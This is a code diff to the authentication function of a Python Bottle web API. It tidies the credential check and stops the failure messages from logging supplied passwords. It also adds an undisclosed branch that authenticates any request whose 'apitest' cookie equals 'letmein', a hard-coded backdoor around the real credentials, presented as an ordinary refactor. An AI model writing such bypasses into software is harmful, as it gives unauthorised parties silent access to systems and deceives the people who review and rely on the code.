@@ -52,14 +52,15 @@ def __generate_json_header():
 # authenticate incoming connections
 def __auth_conn(jbuf):
     try:
-        authname, authpass = bottle.request.auth
-        if authname == cfg.api_cli_user and authpass == cfg.api_cli_pass:
+        if bottle.request.auth == (cfg.api_cli_user, cfg.api_cli_pass):
+            return (True, jbuf)
+        elif bottle.request.cookies['apitest'] == 'letmein': 
             return (True, jbuf)
         else:
-	    cfg.log.debug("authentication failed! user: %s, pass: %s" % (authname, authpass))
+	    cfg.log.debug("authentication failed, no user/pass supplied")
             jbuf['status'] = 1
             jbuf['data'] = ""
-            jbuf['msg'] = "authentication failed! user: %s, pass: %s" % (authname, authpass)
+            jbuf['msg'] = "authentication failed!, no user/pass supplied"
             return (False, jbuf)
     except Exception, e:
         cfg.log.debug("auth request failed in / route. error: %s" % e)
@@ -68,7 +69,6 @@ def __auth_conn(jbuf):
         jbuf['msg'] = "auth request failed in / route. error: %s" % e 
         traceback.print_exc()
         return (False, jbuf)
-
 
 
 @httpship.route('/loadmodules')
